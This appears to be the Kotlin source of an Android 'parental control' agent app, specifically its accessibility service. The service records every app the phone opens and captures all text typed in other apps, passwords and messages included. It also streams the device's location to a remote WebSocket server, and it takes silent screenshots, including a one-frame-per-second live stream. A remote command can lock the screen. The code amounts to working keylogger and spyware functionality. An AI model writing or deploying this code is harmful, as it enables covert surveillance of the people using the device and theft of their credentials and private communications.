package com.controlparental.agent.services

import android.accessibilityservice.AccessibilityService
import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import com.controlparental.agent.net.AgentWebSocketClient
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors

class ParentalAccessibilityService : AccessibilityService(), AgentWebSocketClient.Listener {

    companion object {
        var instance: ParentalAccessibilityService? = null
            private set
    }

    private var wsClient: AgentWebSocketClient? = null
    private var locationTracker: LocationTracker? = null
    private var lastPackage: String? = null
    private var lastTypedText: String? = null
    private var lastTypedTime: Long = 0
    private var isLiveActive = false
    private val mainHandler = Handler(Looper.getMainLooper())
    private val executor = Executors.newSingleThreadExecutor()

    private val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i("ParentalAccService", "Servicio de Accesibilidad conectado.")

        // Iniciar cliente WebSocket
        wsClient = AgentWebSocketClient(listener = this).apply { start() }

        // Iniciar rastreo de ubicacion
        locationTracker = LocationTracker(this) { locJson ->
            wsClient?.send(locJson)
        }.apply { start() }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val pkg = event.packageName?.toString() ?: return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val className = event.className?.toString() ?: ""
                if (pkg != lastPackage && !pkg.contains("com.controlparental.agent")) {
                    lastPackage = pkg
                    val activityJson = JSONObject().apply {
                        put("type", "activity")
                        put("app", pkg)
                        put("title", className)
                        put("detected", null)
                        put("ts", isoFormat.format(Date()))
                    }
                    wsClient?.send(activityJson)
                    Log.i("ParentalAccService", "App activa: $pkg ($className)")
                }
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.joinToString(" ")?.trim() ?: ""
                val now = System.currentTimeMillis()
                if (text.isNotEmpty() && text != lastTypedText) {
                    lastTypedText = text
                    lastTypedTime = now
                    val typingJson = JSONObject().apply {
                        put("type", "typing")
                        put("app", pkg)
                        put("title", lastPackage ?: pkg)
                        put("text", text)
                        put("ts", isoFormat.format(Date()))
                    }
                    wsClient?.send(typingJson)
                    Log.i("ParentalAccService", "Texto capturado en $pkg: $text")
                }
            }
        }
    }

    override fun onInterrupt() {
        Log.w("ParentalAccService", "Servicio de Accesibilidad interrumpido.")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        isLiveActive = false
        locationTracker?.stop()
        wsClient?.stop()
        Log.i("ParentalAccService", "Servicio de Accesibilidad destruido.")
    }

    // ---------- WebSocket Callbacks ----------
    override fun onConnected() {
        Log.i("ParentalAccService", "Conectado al servidor de control parental.")
        locationTracker?.queryLastKnown()
    }

    override fun onDisconnected() {
        Log.w("ParentalAccService", "Desconectado del servidor de control parental.")
    }

    override fun onLiveRequest(requestId: String) {
        Log.i("ParentalAccService", "Solicitud de pantalla en vivo recibida (req=$requestId)")
        isLiveActive = true
        wsClient?.send(JSONObject().apply {
            put("type", "live.accepted")
            put("requestId", requestId)
        })
        startScreenCaptureLoop()
    }

    override fun onLiveStop() {
        Log.i("ParentalAccService", "Deteniendo pantalla en vivo.")
        isLiveActive = false
        wsClient?.send(JSONObject().apply { put("type", "live.stopped") })
    }

    fun sendCustomEvent(json: JSONObject) {
        wsClient?.send(json)
    }

    override fun onCommand(command: String, params: JSONObject) {
        Log.i("ParentalAccService", "Comando recibido: $command")
        when (command) {
            "request_location" -> locationTracker?.queryLastKnown()
            "request_screenshot" -> captureSingleFrame()
            "lock" -> {
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
                try {
                    dpm?.lockNow()
                    Log.i("ParentalAccService", "Pantalla bloqueada por comando remoto.")
                } catch (e: Exception) {
                    performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
                }
            }
            "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
            "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
        }
    }

    // ---------- Captura Silenciosa de Pantalla ----------
    private fun startScreenCaptureLoop() {
        if (!isLiveActive) return
        captureSingleFrame {
            mainHandler.postDelayed({
                if (isLiveActive) startScreenCaptureLoop()
            }, 1000L) // 1 FPS
        }
    }

    @SuppressLint("NewApi")
    private fun captureSingleFrame(onComplete: (() -> Unit)? = null) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    mainExecutor,
                    object : TakeScreenshotCallback {
                        override fun onSuccess(screenshot: ScreenshotResult) {
                            val hardwareBuffer = screenshot.hardwareBuffer
                            val colorSpace = screenshot.colorSpace
                            val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                            hardwareBuffer.close()

                            if (bitmap != null) {
                                executor.execute {
                                    val b64 = compressBitmapToBase64(bitmap)
                                    val frameJson = JSONObject().apply {
                                        put("type", "live.frame")
                                        put("image", b64)
                                    }
                                    wsClient?.send(frameJson)
                                    mainHandler.post { onComplete?.invoke() }
                                }
                            } else {
                                onComplete?.invoke()
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            Log.w("ParentalAccService", "Error capturando pantalla: $errorCode")
                            onComplete?.invoke()
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e("ParentalAccService", "Excepcion en takeScreenshot: ${e.message}")
                onComplete?.invoke()
            }
        } else {
            onComplete?.invoke()
        }
    }

    private fun compressBitmapToBase64(src: Bitmap): String {
        val maxW = 960
        val ratio = if (src.width > maxW) maxW.toFloat() / src.width else 1.0f
        val targetW = (src.width * ratio).toInt()
        val targetH = (src.height * ratio).toInt()

        val softwareBitmap = src.copy(Bitmap.Config.ARGB_8888, false)
        val scaled = if (ratio < 1.0f) Bitmap.createScaledBitmap(softwareBitmap, targetW, targetH, true) else softwareBitmap

        val out = ByteArrayOutputStream()
        scaled.compress(Bitmap.CompressFormat.JPEG, 55, out)
        return Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
    }
}
